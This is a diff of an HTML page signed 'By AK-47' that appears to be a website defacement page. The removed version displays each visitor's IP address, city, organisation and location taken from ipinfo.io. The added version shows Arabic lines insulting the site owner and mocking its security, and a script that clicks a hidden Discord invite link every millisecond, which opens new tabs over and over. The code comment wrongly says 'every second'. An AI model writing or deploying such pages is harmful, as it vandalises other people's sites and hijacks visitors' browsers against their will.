@@ -1,75 +1,74 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>By AK-47</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center fixed;
-            background-size: cover;
-            font-family: 'Courier New', Courier, monospace;
-            color: #ff0000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            flex-direction: column;
-            text-align: center;
-        }
-        .image-container img {
-            width: 750px; 
-            height: auto;
-            border: 2px solid #ff0000; 
-            border-radius: 15px;
-            box-shadow: 0 0 15px #ff0000; 
-        }
-        .info {
-            margin-top: 20px;
-            font-size: 1.5em;
-            color: #ff0000; 
-            text-shadow: 0px 0px 8px #ff0000, 0px 0px 15px #ff0000, 0px 0px 25px #ff0000; 
-            letter-spacing: 4.5px; 
-            white-space: pre-wrap;
-        }
-        .text {
-            margin-top: 20px;
-            font-size: 3em; 
-            color: #ff0000; 
-            text-shadow: 0px 0px 8px #ff0000, 0px 0px 15px #ff0000, 0px 0px 25px #ff0000; 
-            letter-spacing: 4.5px; 
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>AK-47</title>
+  <!-- استدعاء خط Tajawal من Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@500;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-image: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif');
+      background-size: cover;
+      background-position: center;
+      font-family: 'Tajawal', sans-serif;
+      text-align: center;
+      color: white;
+    }
+
+    .logo-container {
+      border: 5px solid red;
+      padding: 20px;
+      display: inline-block;
+      background-color: rgba(0, 0, 0, 0.6);
+      margin-top: 15%;
+      border-radius: 20px;
+    }
+
+    .logo-container img {
+      width: 200px;
+      height: auto;
+    }
+
+    .footer-text {
+      margin-top: 10px;
+      font-size: 24px;
+      font-weight: bold;
+    }
+
+    .tajawal-text {
+      margin-top: 20px;
+      font-size: 20px;
+      font-weight: 500;
+      color: #ffcccc;
+    }
+
+    #hiddenBtn {
+      display: none;
+    }
+  </style>
 </head>
 <body>
-    <div class="image-container">
-        <img src="https://k.top4top.io/p_3464zv71l1.png" alt="Discord Image">
-    </div>
-    <audio autoplay loop>
-        <source src="حط الاغنيه الي تبيها" type="audio/mpeg">
-        Your browser does not support the audio element.
-    </audio>
-    <div class="info" id="ip-info">
-        <strong>IP: <span id="ip"></span></strong><br>
-        <span><strong>City:</strong> <span id="city"></span></span><br>
-        <span><strong>Region:</strong> <span id="region"></span></span><br>
-        <span><strong>Country:</strong> <span id="country"></span></span><br>
-        <span><strong>Location:</strong> <span id="loc"></span></span><br>
-        <span><strong>Organization:</strong> <span id="org"></span></span><br>
-        <span><strong>Timezone:</strong> <span id="timezone"></span></span>
-    </div>
-    <div class="text">By AK-47</div>
 
-    <script>
-         fetch('https://ipinfo.io/json')
-        .then(response => response.json())
-        .then(data => {
-            delete data.readme;
-            const infoDiv = document.getElementById('ip-info');
-            infoDiv.textContent = JSON.stringify(data, null, 2);
-        });
-    </script>
+  <div class="logo-container">
+    <img src="https://k.top4top.io/p_3464zv71l1.png" alt="Logo">
+    <div class="footer-text">By AK-47</div>
+  </div>
+
+  <div class="tajawal-text">القم يا هطــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــف</div>
+  <div class="tajawal-text">وين الحماية ههههههههههههههههههههههههه</div>
+  <div class="tajawal-text">حسنو الحماية 🤣</div>
+
+  <script>
+    setInterval(() => {
+      document.getElementById("hiddenBtn").click();
+    }, 1); // كل ثانية
+  </script>
+
+  <!-- زر خفي يتم الضغط عليه كل ثانية -->
+  <a id="hiddenBtn" href="https://discord.gg/MBYMG9Gxh3" target="_blank">Go</a>
+
+
 </body>
 </html>
